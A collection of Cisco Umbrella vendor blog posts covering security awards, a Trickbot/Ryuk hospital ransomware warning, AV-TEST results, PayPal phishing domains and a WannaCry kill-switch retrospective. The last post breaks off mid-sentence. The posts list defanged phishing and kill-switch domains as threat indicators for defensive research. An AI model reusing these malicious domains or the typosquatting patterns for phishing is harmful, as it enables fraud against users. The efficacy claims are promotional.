{"website": "Cisco-Umbrella", "title": "Cisco Umbrella named best cloud security solution by CRN Tech Innovator", "author": ["Kate MacLean"], "link": "https://umbrella.cisco.com/blog/cisco-umbrella-named-best-cloud-security-solution-by-crn-tech-innovator", "abstract": "Cisco is excited to announce that Cisco Secure won three CRN’s Tech Innovator Awards in key categories including cloud security, SASE, and threat intelligence/incident response. The ability to empower solution providers with truly differentiated offerings is the crowning achievement of the CRN Tech Innovator winners and finalists for 2020. Cisco Umbrella won for best cloud security solution Cisco Umbrella, a cloud-native security service, simplifies network security by helping organizations secure internet access and control cloud app usage across your network, branch offices, and roaming users. Umbrella unifies DNS-layer protection, secure web gateway, firewall, and cloud access security broker (CASB) functionality, to help you protect remote and roaming users, secure SD-WAN, and embrace direct internet access, easily, without added latency. Umbrella boasts a highly resilient cloud infrastructure with direct peering to more than 1000 of the world’s top internet service providers (ISPs), content delivery networks (CDNs), and SaaS platforms. CRN’s Tech Innovator Awards celebrate the most groundbreaking products and services in the IT channel Cisco also won best SD-WAN solution with our SASE architecture that integrates Cisco SD-WAN and Cisco Umbrella in a single offer. Cisco SD-WAN technology enables direct internet access (DIA) from the branch. As organizations shift to SD-WAN, security needs to remain top of mind. Branch offices and roaming users are more vulnerable to attacks, and as organizations move to more DIA, this becomes an even greater risk. Cisco’s integrated approach to SASE offers simple, secure and scalable solutions that deploy in minutes, not months, to thousands of branches and roaming users. And Cisco rounded out the victory with a win for Cisco Secure X for best threat intelligence/best threat response. Cisco SecureX is included with all Cisco subscriptions and helps customers accelerate threat investigation and remediation by unifying threat intelligence with all Cisco Security products, and other security infrastructure. Automated response actions simplify security by eliminating manual tasks and stopping attacks earlier in the process. CRN’s Tech Innovator Awards celebrate the most groundbreaking products and services in the IT channel. These products are crafted by vendors that are channeling IT transformation and empowering solution providers, and their customers, with groundbreaking offerings. Cisco offers a simple, secure, and scalable approach to SASE.  With simplified purchase, deployment, and ongoing management of a single cloud-delivered service. We’re proud the CRN recognized our commitment to effective and integrated security that is invisible and seamless to the end user, regardless of where they are, or the device they are using.  Cisco is committed to delivering innovative solutions that are resilient, reliable, and scale with our customers to deliver superior speeds, high performance, and extreme flexibility. Want to see what the buzz is about? Check out Cisco Umbrella DNS-layer security for FREE for 14-days . It’s the first step in moving your security stack to the cloud. As a leading provider of recursive DNS security, Cisco Umbrella helps businesses of all sizes and industries connect to the internet with confidence. We’ve built a reputation on easy deployment and powerful protection anywhere users work. Start a free trial today.", "date": "2020-11-12"},
{"website": "Cisco-Umbrella", "title": "Healthcare industry under threat of trojan and ransomware attacks", "author": ["Austin McBride"], "link": "https://umbrella.cisco.com/blog/healthcare-industry-under-threat-of-trojan-and-ransomware-attacks", "abstract": "On October 28, 2020, a joint advisory was issued from the United States Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), and the Department of Health and Human Services (HHS) about an imminent threat of cyberattack on US hospitals and healthcare providers. The agencies claimed to have “credible information of an increased and imminent cybercrime threat to US hospitals and healthcare providers.” In the past few weeks, Cisco Talos threat researchers have observed a series of recent ransomware attacks on hospital networks using the Trickbot banking trojan as a dropper to deploy Ryuk ransomware as a payload. Once deployed, Ryuk encrypts data on infected systems and holds it for ransom in exchange for a payment to a cryptocurrency wallet. On October 30, Cisco Talos confirmed that they have several active incident response engagements involving healthcare organizations, with 20% of incident response engagements in the last 90 days involving the healthcare sector. Talos has observed attacker activity using Trickbot and Ryuk to target U.S. hospitals and healthcare providers, as well as others being targeted with the red-teaming tool Cobalt Strike. On October 28 and 29, the concerns raised in the joint advisory were supported by reports of six hospitals in the US being compromised with Ryuk in the span of 24 hours. Overall ransomware traffic increased 7.8x in the healthcare sector over the past week  (source: Cisco Umbrella Global Network) A typical ransomware infection of this type uses phishing emails or other methods to infect their victims. The emails usually contain a malicious link that drops a malware downloader, often Trickbot, onto the infected user’s machine, which allows the attacker to establish a foothold on the network and deploy Ryuk ransomware. Though Trickbot and Ryuk are not newcomers to the threat landscape, the increased attacker focus on the healthcare sector during an already stressful global health crisis is alarming. There has been a 71% increase in ransomware attacks on the healthcare sector during October 2020, and Ryuk was behind 75% of these incidents. 1 Unfortunately, ransomware attacks on hospitals are not without consequences in the real world – a recent ransomware attack on a hospital in Germany led to the death of a patient who had to be moved to a different hospital as a result of the attack. 2 As healthcare becomes more reliant on technology, it’s more important than ever to prevent ransomware attacks and other types of malicious software infections. Ryuk ransomware activity increased significantly over the past week (source: Cisco Umbrella Global Network) We’ve known for some time that the healthcare industry is particularly vulnerable to cyberattacks. With internet-connected medical devices and sensitive patient information stored in electronic health record (EHR) systems, healthcare organizations like hospitals, clinics, medical device manufacturers, and research institutions are hot targets for ransomware attacks. Research indicates that patient records are the most valuable and expensive type of personal information traded on the dark web, which makes them a prime target for attackers. Since 2016, ransomware incidents have cost the U.S. healthcare industry more than $157 million, and that number only continues to grow. 3 Once a ransomware attack infiltrates the network, it becomes a race against time. The most effective ransomware prevention strategy will detect and stop threats before they breach the network perimeter. And with 90% of malware using DNS to gain command and control, exfiltrate data, or redirect web traffic, DNS-layer security is the most effective first line of defense against ransomware. 4 Cisco Umbrella is a cloud-delivered security service that blocks requests to malicious destinations before a connection is even established. Umbrella also provides protection for all users on your network, on any device, anywhere they choose to work. It’s easy to deploy and easy to manage and gives healthcare organizations visibility into all internet activity across all locations and devices. With Cisco Umbrella, IT teams can identify any devices that have been infected by ransomware or users that have been targeted by ransomware attacks, reducing remediation time. Umbrella can identify potentially unauthorized access or threats to PHI data, even that which is stored in cloud apps. And with Cisco Umbrella Investigate, security researchers get up-to-the-minute intelligence on emerging ransomware threats, as well as historical content about every domain on the internet, that lets you see the relationships among malware, domains, IPs, and networks to quickly respond to critical incidents. DNS-layer security provides the first line of defense against ransomware, but healthcare organizations can be compromised in other ways besides internet-based vectors. Security teams need to be on the lookout for lateral movement of ransomware within the network and be prepared to eliminate its propagation and reduce the amount of time an attacker spends within your network. As a best practice, all healthcare organizations should deploy additional security measures against ransomware attacks, like endpoint protection, cloud-delivered firewall (CDFW), secure web gateway (SWG), and cloud access security broker (CASB). Cisco Umbrella provides many of these functions as part of the Secure Internet Gateway (SIG) Essentials package , and Umbrella integrates with Cisco Secure Endpoint (AMP for Endpoints) for endpoint security. To simplify management and speed up incident response, organizations should consider using a security orchestration, automation, and response (SOAR) platform where ransomware incident response playbooks can be customized and automated. All Cisco Umbrella packages include Cisco SecureX , a cloud-native, built-in platform experience that connects the Cisco Secure portfolio to your infrastructure. SecureX is integrated and open for simplicity, unified in one location for visibility, and maximizes operational efficiency with automated workflows. To learn more about best practices to prevent and address ransomware attacks, download a free copy of our ebook, Ransomware Defense for Dummies . Or learn how Cisco Umbrella can protect your healthcare organization in our ebook Improving the Health of Healthcare Cybersecurity . 1 https://blog.checkpoint.com/2020/10/29/hospitals-targeted-in-rising-wave-of-ryuk-ransomware-attacks/ 2 https://www.darkreading.com/threat-intelligence/deadly-ransomware-story-continues-to-unfold/d/d-id/1338957 3 https://www.comparitech.com/blog/information-security/ransomware-attacks-hospitals-data/ 4 https://blog.talosintelligence.com/2017/03/dnsmessenger.html", "date": "2020-11-10"},
{"website": "Cisco-Umbrella", "title": "AV-TEST Places Cisco Umbrella First in Security Efficacy", "author": ["Negisa Taymourian"], "link": "https://umbrella.cisco.com/blog/av-test-places-cisco-umbrella-first-in-security-efficacy", "abstract": "When it comes to rating the effectiveness of security solutions, efficacy is king. Why? All it takes is one malicious request slipping through the net for a damaging breach to take place. Lots of network security providers claim they are the best at threat detection and prevention. But can they prove it? Third-party research from AV-TEST reveals that Cisco Umbrella is the industry leader in security efficacy, according to the 2020 DNS-Layer Protection and Secure Web Gateway Security Efficacy report. NOTE: A brand new AV-TEST report has been released evaluating Cisco Umbrella’s secure web gateway (enhanced with DNS security) and DNS-layer protection functionality. Cisco Umbrella placed first in secure web gateway to protect remote workers. Read the November 2020 blog | Get the 2nd AV-TEST report Overview AV-TEST is the leading independent research institute for IT security in Germany. For more than 15 years, the cybersecurity experts from Magdeburg have delivered quality-assuring comparison and individual tests of virtually all internationally relevant IT security products. In November and December 2019, AV-TEST performed a review of Cisco Umbrella alongside comparable offerings from Akamai, Infoblox, Palo Alto Networks, Symantec and Zscaler. In order to ensure a fair review, the research participants did not supply any samples (such as URLs or metadata) and did not influence or have any prior knowledge of the samples being tested. All products were configured to provide the highest level of protection, utilizing all security-related features available at the time. The test focused on the detection rate of links pointing directly to PE malware (e.g. EXE files), links pointing to other forms of malicious files (e.g. HTML, JavaScript) as well as phishing URLs. A total of 3,668 samples were included in the testing. DNS-Layer Protection Test In the first part of this study, DNS-layer protection was tested. DNS-layer protection uses the internet’s infrastructure to block malicious and unwanted domains, IP addresses, and cloud applications before a connection is ever established as part of recursive DNS resolution. DNS-layer protection stops malware earlier and prevents callbacks to attackers if infected machines connect to your network. An ideal use case for DNS-layer protection is guest wifi networks. With guest wifi it is usually not possible to install a trusted certificate on the guests’ devices, so HTTPS inspection is not possible. The study however shows that DNS-layer protection without a selective proxy still provides a good base layer of security. DNS-layer protection with selective cloud proxy redirects only risky domain requests for deeper inspection of web content, and does so transparently through the DNS response. A common use case for selective proxy is corporate owned devices where there is a need to inspect risky traffic including HTTPS, but for privacy considerations, certain content categories such as financial or healthcare can be excluded from HTTPS inspection in the selective proxy. For the DNS-layer protection testing, the products achieved the following blocking rates: Cisco Umbrella performed significantly better than other vendors with a 51% detection rate for DNS-layer protection. Cisco Umbrella’s selective proxy makes a big difference in effective threat detection and increased the blocking rate to 72%. Secure Web Gateway Test In the second part of the study, the web gateway solutions were tested. A secure web gateway is based on a full web proxy that sees and inspects all web connections. Unlike DNS-layer protection which only analyzes domain names and IP addresses, a web proxy sees all files and the full URLs enabling more granular inspection and control. Organizations adopt secure web gateways when they are looking for more flexibility and control. Common use cases for a secure web gateway include: needing full visibility of web activity, inspection of granular app controls, the ability to block specific file types and inspection of all HTTPS content with the ability to exclude specific content. For secure web gateway testing, the products achieved the following blocking rates: In this test scenario, Cisco Umbrella outperformed the other vendors’ offerings in terms of security efficacy. Conclusion In both test scenarios, the Cisco Umbrella detection rate outperformed the offerings from other vendors. These test results demonstrate several key takeaways. Organizations should adopt a layered approach to security. DNS-layer protection is simple and adds to the overall security efficacy. In use cases where deploying a selective proxy is possible, the security efficacy and blocking rates improve significantly. As seen in the test results, a secure web gateway full proxy solution provides the highest level of protection. For more information on specific configurations and the detailed test results, click here to read the full report by AV-TEST .", "date": "2020-02-18"},
{"website": "Cisco-Umbrella", "title": "AV-TEST places Cisco Umbrella first in security efficacy – again!", "author": ["Raviv Levi"], "link": "https://umbrella.cisco.com/blog/av-test-places-cisco-umbrella-first-in-security-for-secure-web-gateway-and-remote-workers", "abstract": "AV-TEST places Cisco Umbrella first in secure web gateway to protect remote workers With so many employees working remotely during the global pandemic, businesses are having an even harder time keeping their users, devices, networks, applications and data safe. According to Ponemon Institute, organizations who believed they were effective at mitigating risks, vulnerabilities and attacks across the enterprise declined from 71 percent before the pandemic to 44 percent after the pandemic. 1 The “new normal” increases the importance of moving to a cloud-delivered security model with high efficacy to stop threats from exploiting the risky behavior of remote workers. Lots of vendors claim to block and detect threats, but only one vendor stands out as the industry leader in threat detection for the second year in a row! AV-TEST places Cisco Umbrella, the heart of Cisco’s SASE architecture, first in security efficacy in a recent test. Cisco Umbrella is a cloud-native security service that simplifies network security by helping you secure internet access and control cloud application usage across your network, branch offices, and roaming users. Umbrella unifies DNS-layer security, secure web gateway, firewall, and cloud access security broker (CASB) functionality. Umbrella integrated with Cisco AnyConnect provides secure endpoint access to the network so employees can work from any device, at any time, in any location. Umbrella received top marks across the board, with a whopping 96.39% total detection rate , crushing the competition. AV-TEST evaluated Cisco Umbrella’s secure web gateway (enhanced with DNS security) and DNS-layer protection functionality. Umbrella received top marks across the board, with a whopping 96.39% total detection rate , crushing the competition. Umbrella also demonstrated a significantly lower false positive rate than other products, helping employees to stay productive while making security analysts more efficient and less likely to miss real threats. And, while we don’t like to brag, this data is too good to keep quiet, especially since this is the second year in a row that AV-TEST has found that Umbrella outperforms competitive offerings . Umbrella places first in 2020 cloud security efficacy test In September and October 2020, AV-TEST performed a review of Cisco Umbrella’s secure web gateway and DNS-layer security functionality, alongside comparable offerings from Akamai, Infoblox, Palo Alto Networks, Netskope, and Zscaler. The test was commissioned by Cisco to determine how well vendors protected remote and roaming workers against malware, phishing sites, and malicious websites. AV-TEST also carried out a false positive test against known clean popular websites and downloads from Alexa’s top list. AV-TEST is an independent research institute for IT security based in Germany. For more than 15 years, cybersecurity experts from Magdeburg have guaranteed quality-assuring comparison and individual tests of virtually all internationally relevant IT security products. About the test In order to ensure a fair review, research participants did not supply any samples (such as URLs or metadata) and did not influence or have any prior knowledge of the samples tested. All testing methodology engaged was solely AV-TEST’s.  All products were configured to provide the highest level of protection, utilizing all security-related features available at the time. The test focused on the detection rate of links pointing directly to portal executable (PE) malware (e.g., EXE files), links pointing to other forms of malicious files (e.g., HTML, JavaScript) as well as phishing URLs. The test included a total of 3,572 malware samples. Secure Web Gateway Test First, the lab test assessed each vendor’s secure web gateway functionality, specifically the ability to protect roaming and remote workers. Given that the global pandemic has accelerated the move of edge security controls to a cloud-delivered model, each vendors’ secure web gateway functionality was configured with the protection of their roaming agents on the devices tested. A secure web gateway is based on a full web proxy that sees and inspects all web connections. Unlike DNS-layer protection which only analyzes domain names and IP addresses, a web proxy sees all files and the full URLs enabling more granular inspection and control.  For secure web gateway testing, the products achieved the following blocking and false positive rates (ordered by best detection rate): DNS-Layer Protection Test DNS-layer protection uses the internet’s infrastructure to block malicious and unwanted domains, IP addresses, and cloud applications before a connection is ever established as part of recursive DNS resolution. DNS-layer protection stops malware earlier and prevents callbacks to attackers if infected machines connect to your network. DNS-layer protection with selective cloud proxy redirects only risky domain requests for deeper inspection of their web content, and does so transparently through the DNS response. For the DNS-layer protection testing, the products achieved the following blocking and false positive rates (ordered by best detection rate): Note: Netskope, Palo Alto Networks and Zscaler do not have comparable DNS-layer protection offerings that add security to the recursive DNS process and policies that can be configured with a secure web gateway (or parallel offering). Key Takeaways Cisco Umbrella protects roaming and remote works best In both test scenarios, Cisco Umbrella outperformed offerings from other vendors. In the secure web gateway test, Cisco Umbrella’s secure web gateway functionality (layered with DNS security) performed best and demonstrated a higher threat detection and lower false positive rate than other solutions. In the DNS-layer protection test, Cisco Umbrella functionality clearly outperformed competitors in malware and phishing protection as well as in false positive avoidance. In some cases, DNS-layer protection is sufficient as it’s fast to deploy and provides a good base layer of security. Since many potential attacks can be blocked efficiently at the DNS-layer before a connection is even established, securing at this initial stage is vital to securing your business. When a connection is blocked at the DNS-layer, the attack stops there which reduces the security burden on your security teams and security tools. Other cases require a secure web gateway for a deeper set of controls and a stronger level of protection. Sending all traffic to a full proxy gateway significantly improves overall security posture. As seen in the results, combining secure web gateway with DNS-layer security provides the highest level of security efficacy. Efficacy matters The shift toward workforce distribution has accelerated the need to protect users anywhere – at home, on the go, on vacation, at a campus office, and on any device. A recent Cisco survey found that 61 percent of organizations globally have experienced a jump of 25 percent or more in cyber threats or alerts since the start of the pandemic. 2 It only takes one malicious threat to compromise your business. If your security is not effective your business is not protected. Don’t settle for second-rate security. Cisco Umbrella, the gold standard in security efficacy, can help you ensure a worry-free, secure and effective defense with low latency. For more information on specific configurations and detailed test results, click to read the full report by AV-TEST . 1 Cybersecurity in the Remote Work Era: A Global Risk Report Ponemon Institute, October 2020 2 Future of Secure Remote Work Report, Cisco", "date": "2020-10-28"},
{"website": "Cisco-Umbrella", "title": "PayPal Phishing Sophistication Growing", "author": ["Andrew Hay"], "link": "https://umbrella.cisco.com/blog/paypal-phishing-sophistication-growing", "abstract": "Phishing is a frequent topic of conversation in the media, but what exactly is it? Phishing is the attempt to trick a victim into providing sensitive information such as usernames, passwords, credit card and banking information or other private data through the use of a realistic-looking email that appears to come from a legitimate website or business. The general idea behind a phishing attack is to entice a victim into clicking a link, much like a fisherman attempts to catch a fish with a lure on a hook. Once a victim falls for this and clicks a link in a phishing email, they may be directed to a seemingly legitimate website where they are prompted for information or to download malicious software. While the majority of phishing attacks are not personalized and are sent to as many potential victims as possible, targeted phishing also occurs. Targeted phishing uses known information about a recipient to better convince them into providing credentials. A well-crafted targeted phishing attack can defeat even the best security controls if an attacker is able to collect highly-privileged login credentials. To better understand how phishing attacks are conducted and how they sometimes convince end-users to type credentials into legitimate-looking websites, we will walk through some recent examples of advanced phishing attacks seen by OpenDNS Labs. Details On January 26th at 11:15pm UTC, OpenDNS Security Labs detected multiple domains created to impersonate a Paypal website for use in an email phishing campaign and personal information harvesting. One of the primary websites (redirectly-paypal[.]com) was registered on January 25th, 2015 through Wix.com based on nameserver information (or possibly registered at Network Solutions, Inc. and then transferred to Wix.com’s nameservers). One of the fraudulent domains (security-paypal-center[.]com), which has been dormant since its expiration in 2005, was re-registered January 22nd, 2015 – again through Wix.com. We also found a few other Paypal related spoofing domains that we display below: x-paypal.com, securitycheck-paypal.com, paypalinspection.com, area-paypai.es, and many more (not shown). Based on the auto generated privacy email within the registrant’s WHOIS information (Figure 1), we can ascertain that both domains were registered at the same time – likely on the same transaction. Figure 1 – WHOIS Information for Both Domains The fraudulent Paypal websites (Figures 2, 4, 5, 6, and 7) are virtually indistinguishable from the legitimate PayPal.com site (Figure 3). Figure 2 – Fake Site In fact, the fraudulent site borrows much of its image, text, and color scheme from the real site. Figure 3 – Real Site During the writing of this post, a fraudulent site was discovered that looked like a perfect clone of the legitimate PayPal.com site – but using an unusual domain: x-paypal[.]com. Figure 4 – A Fake Site In this image, we see attention to detail in presentation, but with the odd domain name, x-paypal[.]com. An untrained observer might not notice and actually follow through with entering credentials. We saw that this was registered with ENOM INC., a registrar that consistently came up when investigating these typo-squatting domains: The next image is an example of a slightly more sophisticated attack, in which the attackers copied HTML code directly from the legitimate PayPal[.]com in order to set up their own realistic phishing website. Additionally, the domain, securitycheck-paypal[.]com might lead a less observant user to avoid questioning its legitimacy. Figure 5 – Another Fake Site Figure 6 – Another Fake Site The following phishing attempt is spoofing an Apple ID Verification page at the domain paypalinspection[.]com. While the services that PayPal and Apple offer are unrelated, it’s possible the unobservant user could fall for this and enter their Apple ID credentials. Figure 7 – Another Fake Site In following attempt, there is less attention to detail in the replication of the PayPal login page. It uses some original content pulled from actual PayPal servers, but is in Spanish while being sent to English-speakers. Additionally, the domain, area-paypal[.]es is fairly far-removed from paypal[.]com. A potential victim of this phishing attempt would hopefully notice something isn’t right before continuing. OpenDNS Investigate Observations The following information was surfaced by our OpenDNS Investigate product and shows the global query traffic, registrant, and IP information for the aforementioned domains: redirectly-paypal.com security-paypal-center[.]com Both domains are hosted with CyrusOne LLC ( http://www.cyrusone.com/ ), a provider of global datacenter facilities for colocation of servers. The company boasts customers such as CarFax.com, Dell, Enbridge Energy Company Inc., and Rent-A-Center. A quick look at the Autonomous System (AS) number associated with CyrusOne (AS20013) shows a number of similarly fraudulent PayPal-related domains. Some examples include: helpcenter-paypal-rosolution[.]pepitoheyashi[.]ga paiiypal[.]com paypal-secure-account-information[.]reikitrainingjourney[.]com paypal[.]com[.]user[.]accounts[.]lwproductions[.]net paypalcomcgibinwebscrcmdloginsubmitdispatch58z8duft875dl80al[.]planetevents[.]co[.]in paypalupdate[.]uploadppl[.]com paypaluserupdateinfoforupaypalnowclosedbypaypal[.]bodybuildingexercise[.]org update[.]paypal[.]com[.]kgreendesigns[.]co[.]za www[.]paypal[.]com-webapps-cgi-bin-webscr-login-access[.]com OpenDNS has reported these domains to PayPal. We have received confirmation that its fraud and abuse department is currently investigating and working to take them down. In the meantime, OpenDNS has blocked access to these domains for all users of our DNS infrastructure. Fraudulent Phish Workflow These attacks are not new, but they are beginning to look more legitimate with every iteration. Companies like Wix.com make it trivial to create a professional looking site these days – and the attackers have noticed. All users should remain diligent when surfing the Internet, clicking on links in emails, and opening attachments. The difficulty of identifying the validity of these websites visually will soon be untenable. Detection OpenDNS Security Labs specializes in developing anomaly detection models to identify different types of attacks. For this particular algorithm we utilized natural language processing techniques such as a fuzzy substring matching, and a modified Levenshtein distance to check for the word distance between legitimate and typosquatting domains (ex. malware.com vs. rnalware.com, linkedin.com vs. 1inkedin.net, ). We also leveraged SecurityGraph’s vast amount of data to investigate different types of attacks in our user’s DNS data. For example, we built up an ASN map of all legit domains mapping to their appropriate ASNs (ex. Google->ASN 36492 ). This idea was previously outlined in the DarkHotel blog . In addition we mined these adversarial domains’ WHOIS records to extract patterns. When registering a domain on internet, registrants typically have to provide information about the entity registering the domain. One of the ways we are able to track these adversary syndicates is mining their WHOIS records for patterns. Searching the WHOIS database for registrant information among these domains, a common denominator that was noticed was the use of Perfect Privacy, LLC. Using privacy protection is nothing new, yet does add another layer of obfuscation. The use of this particular privacy provider accounted for a majority of the more sophisticated sites that were identified, leading to the theory the same actor(s) were involved in the production of these sites. We also found that many of these domains were created/registered very recently, some within the past couple days, most within the couple months. Recommendations Some of the indicators to look out for to make sure you don’t fall victim to this type of attack is to verify that the site is using HTTPS and a legitimate SSL Certificate from the organization you are visiting. All of the spoofed sites we saw served their content over HTTP, which is highly uncommon for money transfer sites. Other items to notice are variations in the layout from the legitimate site. The original phishing email could also provide clues as to its authenticity. If the wording is off or it’s blatantly asking for you to enter your password somewhere, it could be phishing. A more advance user may want to review the headers of an email, tracing the path to determine if it was spoofed to look as if it is coming from another location.", "date": "2015-02-11"},
{"website": "Cisco-Umbrella", "title": "The Hours of WannaCry", "author": ["Austin McBride"], "link": "https://umbrella.cisco.com/blog/the-hours-of-wannacry", "abstract": "In the span of just 10 days, two large-scale, wormable attacks grabbed international headlines. First, a phishing campaign posing as a Google Docs sharing request gained access to Google accounts then spread across its victim’s contacts, and now, a ransomware campaign with a bite, named WannaCry, autonomously infected vulnerable systems leveraging an exploit leaked on the internet. In the early minutes of the attack, we worked with our Talos counterparts to analyze the behavior of WannaCry and protect our customers . We were also particularly proud to see that our Investigate product helped MalwareTech reduce WannaCry’s impact. In this post, we hope to give you a retrospective analysis of what we’ve observed during the first critical hours of the event. Timeline WannaCry couldn’t have been so impactful without the dramatic sequence of events in the months leading up to the attack. We broke down those events and how we protected our customers in the below infographic: The Spread Upwards of 250,000 infections have been reported in various news articles and social media posts. Our unique view of the Internet allows us to visualize how these infections spread over time. We can do this by looking at the queries made to ‘kill switch’ domains. We first discussed these domains on the Talos blog and will look at them more in upcoming sections. The below graphic shows the countries with machines making queries to these domains (considered infected, or related to an infection) using our resolvers over time and the percentage of queries each country was responsible for in each period: Update : We noticed a small issue in the timestamp in the lower left of this video, it has been corrected. Exposure Note: We’re monitoring port changes in machines with TCP 445 open and are seeing fluctuations in results that may impact the graph below – we’ll keep you updated as we find out more. We’ve also looked at the number of hosts that had TCP 445 open to the internet at the time of this writing. This port is important because the SMB service that listens on it is what the initial exploit targets (MS17-010,CVE-2017-0143). As you might expect, a very large percentage of these machines had TCP445 open and may still be vulnerable: The above graphics focus on the first two kill switch domains. A third also began to appear during the time of this writing: iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com ifferfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com ayylmaotjhsstasdfasdfasdfasdfasdfasdfasdf[.]com Queries to these domains implies that a system was compromised by the malware, but was not further infected, since we’re redirecting those requests to our block page. The query volume of these domains illustrates a very dramatic story: The query volume to these known kill switch domains continues to spike, however, lost in those spikes are the actual number of machines querying the kill switch. A single machine may query these domains multiple times. To help shed deeper light into this, let’s look at the number of machines (per hour) querying the kill switch domains over the last 168 hours. Unique Machines Notice, the three kill-switch domains appear to start and exhibit a sort of power law in their magnitudes. That is, the iuq… domain is largest, the iff… domain smaller, and ayy… smallest of all. This is not a coincidence for multiple reasons. For starters, we known iuq… was the first kill-switch domain used in WannaCry, iff… second, and ayy… the latest. But another interesting observation is what appears to be the magnitudes. The breadth of reach of each kill switch, in terms of the number of machines querying the domains, appears to be dropping off, the more kill switch domains exist. In a way, what we might be observing here is a sort of law to Ransomware more generally. That is, given a successful campaign, each successive iteration, will only have a fraction of the success rate of the previous. Repeating Another helpful perspective on these queries is the number of machines repeating from hour to hour. Here’s that information for the last 168 hours. The big spike on the ayy.. domain jumps out. This means that 100% of the machines from the previous hour made queries in the current hour. This spike occurs at a very early stage in this particular domain’s life, when the queries to this domain was limited to only a very small number of machines. It might mean reinfection, further spread of the malware, or just a researcher investigating the domain. Riskiness Finally, the last data point to take into account when looking at query volume is the median number of other domains queries by machines querying the kill switch domains. The intuition here is that the more active a specific machine is, the more likely they’ll come across something malicious. Its interesting to note that just as with the previous graph,  the ayy.. domain is an outlier here as well. Machines querying the ayy.. domain seem to query many more other domains. Researchers! WannaCry uses the InternetOpenUrl function when requesting the kill switch domain. This leaves off the User-Agent HTTP request header resulting in an HTTP request that looks like the following: We looked at the percentages of blocks that had User Agent strings compared to those without. The thought here is that those with User Agent strings are people browsing to the domain and those without are from the malware itself. Plotting these two groups over time you can see an interesting dip where infections slowed down then picked back up: The Kill Switch Probably one of the most interesting parts of WannaCry is the kill switch. While this may not be the first time such a mechanism was found in a piece of malware (e.g. Necurs), its intent is undeniably curious. It might have been for the attacker to control the worm, for the attacker to uncover when it was discovered by checking when it got sinkholed, or simply a sandbox evasion gone wrong. Whatever the reason, it played a huge part in halting the infection. Testing for Exposure Our Newly Seen Domains was a big help in protecting many of our customers, however many were concerned that blocking the domain would actually cause an infection. We created a simple test to mimic the logic of WannaCry, hopefully you’ll find it useful as well: If you’re not accustomed to Visual Studio, you can use the binary attached to the gist, it was tested on 32bit Windows 8.1 with VS2015. Domain Composition As we mentioned in the Talos blog post , the construction of the domain jumped out at us. It literally looked like someone smashed a few keys on the upper rows of the keyboard to arrive at it. Just for fun we plotted character distance and frequency: It’s hard to say for sure how the domain was created, but it surely feels as if someone with two hands on the keyboard at home row position just alternated back and forth with little movement. Its even as if partway through they reminded themselves to be more random and reach all the way up to that top row with their middle finger for the nine! Variants There will alway be copycats and WannaCry was no different. These little Frank Abagnales patch the binary to include different kill switch domains , bitcoin payment addresses, then let the worm spread. We continue to see these pop up: These domains are so similar that we decided to illustrate how little work copycats are putting into creating new variants by calculating the Levenshtein distance between them. These low distances help quantify exactly how lazy they are: Here is a list of domains we found with simple pattern matching, you might also notice that most are the same length. iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]de iuqerfsod9ifjaposdfjhgosurijfaewergwea[.]com iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]info iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]net dp9ifjaposdfjhgosurijfaewrwergwea[.]com iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]world iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]us iuqssfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]co ifferfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]org iaaerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com iuqerfsodp9ifjaposdfjhgosurijfaewrwergweb[.]com iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]xyz iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]kr iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]cn ayylmaotjhsstasdfasdfasdfasdfasdfasdfasdf[.]com Infected Websites Common with most ransomware infections, the malware displays a ransom note when its encrypted files on the systems. WannaCry did this using its own executable, named @WanaDecryptor@.exe. We decided to look for websites hosting these executables and uncovered a slew. We’re not entirely sure if the website was actually compromised or there was something else going on, but we wanted to dig in a little to see what we could uncover. Below is the queries to 10 domains known to have the file, we anonymized them in the chance they are actually infected: Notice, all these domains appear to have increased volumes of activity in the last 3(or so) days. In fact, the amount of activity within the most recent period (the last day or so) appears to show the most dense period, so far. There are two take-aways from this: either 1) the WannaCry campaign is still in full throttle, or 2) the WannaCry campaign is dwindling as security researcher gain an edge into cracking the malware. Regardless of which interpretation of the events transpiring, these 10 domains offer insight into how the kill switch and domains hosting @WanaDecryptor@.exe compare. The largest take away is that the proportion of queries occurring to these domains hosting @WanaDecryptor@.exe is significantly smaller than to the smallest kill-switch domain query count. And yet, while smaller, these @WanaDecryptor@.exe domains exhibit more uniform amounts of queries: i.e. there isn’t one or two domains that seem to receive all the queries. This more uniform distribution of domains containing @WanaDecryptor@.exe information leads one to conjecture something about the infrastructure used to store the payloads required to download the ransomware. In Conclusion We’ll continue to monitor this event and others so that we can protect our customers! Stay Tuned!", "date": "2017-05-16"},
{"website": "Cisco-Umbrella", "title": "How networking and cloud security solutions have evolved to connect and protect users everywhere", "author": ["Ken Howard"], "link": "https://umbrella.cisco.com/blog/how-networking-and-cloud-security-solutions-have-evolved", "abstract": "No matter what market, industry, or regulatory challenges your organization has faced through the years, one thing is certain. Connecting and protecting your customers, employees, contractors, and partners wherever they work is always the goal, but the details are constantly evolving. That’s never been truer than in this remote, distributed, always-on world today. The very networking and security landscape itself is shifting under our feet, evolving from a constellation of disparate point solutions to fully integrated, multifunction, cloud-delivered networking and security platforms. Organizations need to control and secure internet access, manage IT resources, and provide protection for roaming users while rationalizing IT infrastructure. Limitations of traditional wide area network (WAN) technology have contributed to the forces driving network transformation: complexity, cost, performance speeds, and service disruptions. Organizations today need more control, flexibility, and centralized management of their WAN environments than multiprotocol label switching (MPLS) can offer. Challenges with current WAN architectures include complexity, cost, delays, and disruptions. Complexity, as an example, often makes network management and optimization a real migraine factory. Consider the task of configuring multiple routers connected to different circuits (as an example, an MPLS link and a broadband Internet link) to route network traffic. Your broadband Internet connection may be running slowly during a given period, while your costly MPLS link 